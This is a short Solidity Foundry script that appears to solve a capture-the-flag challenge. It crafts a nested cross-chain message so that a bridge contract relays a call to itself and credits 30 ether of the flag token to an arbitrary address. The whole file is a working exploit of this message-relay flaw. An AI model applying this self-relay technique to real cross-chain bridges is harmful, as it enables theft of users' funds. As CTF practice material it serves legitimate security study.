// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2 as console} from "forge-std/Script.sol";
import {Challenge} from "src/Challenge.sol";
import {Bridge, IERC20} from "src/Bridge/bridge.sol";
import {IMultiSig} from "src/multisig/IMultiSig.sol";

contract ToolScript is Script {
    function run() public {
        uint256 l1ChainId = 78704;
        uint256 l2ChainId = 78705;
        Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // Execution Flow:
        // L1 -> L2 -> L1 (ERC20In())
        // L1 ERC20In() message
        Bridge bridge = Bridge(payable(challenge.BRIDGE()));
        IERC20 token = IERC20(challenge.FLAG_TOKEN());
        bytes memory erc20InMessage = abi.encodeWithSignature(
            "ERC20In(address,address,uint256)",
            address(token),
            address(1), // any address
            30 ether // > 10 ether
        );

        // L2 -> L1: sendRemoteMessage()
        bytes memory l2Message = abi.encodeWithSignature(
            "sendRemoteMessage(uint256,address,bytes)",
            l1ChainId,
            address(bridge),
            erc20InMessage
        );

        // L1 -> L2
        bridge.sendRemoteMessage(l2ChainId, address(bridge), l2Message);
        vm.stopBroadcast();
    }
}
